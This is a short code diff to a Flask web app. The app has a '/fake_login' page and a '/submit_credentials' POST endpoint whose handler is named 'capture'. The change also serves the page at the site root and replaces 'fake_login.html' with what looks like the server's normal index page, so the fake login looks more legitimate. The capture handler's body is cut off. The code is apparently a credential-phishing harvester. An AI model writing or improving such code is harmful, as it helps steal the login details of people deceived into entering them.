@@ -3,8 +3,9 @@ from flask import Flask, request
 app = Flask(__name__)
 
 @app.route("/fake_login", methods=["GET"])
+@app.route("/", methods=["GET"])
 def show_login():
-    return open("fake_login.html").read()
+    return open("var/www/html/index.html").read()
 
 @app.route("/submit_credentials", methods=["POST"])
 def capture():
